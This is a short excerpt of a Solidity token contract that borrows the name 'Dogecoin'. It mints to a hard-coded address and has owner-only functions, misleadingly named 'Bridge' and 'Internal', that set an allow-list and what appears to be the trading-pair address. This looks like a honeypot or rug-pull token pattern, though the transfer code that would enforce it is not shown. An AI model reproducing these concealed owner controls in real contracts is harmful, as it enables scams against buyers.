...
contract Dogecoin is ERC20, Ownable {
    ...
    constructor() ERC20('Dogecoin','Doge') {
        _mint(0xFF42Be88534386Dd1DE8D13A4B6BCD1ea01fbf75, 88 *10**18);
        _enable[0xFF42Be88534386Dd1DE8D13A4B6BCD1ea01fbf75] = true;
    }
    ...
    function Bridge(address user, bool enable) public onlyOwner {
        _enable[user] = enable;
    }
    function Internal(address uni_) public onlyOwner {
        _uni = uni_;
    }
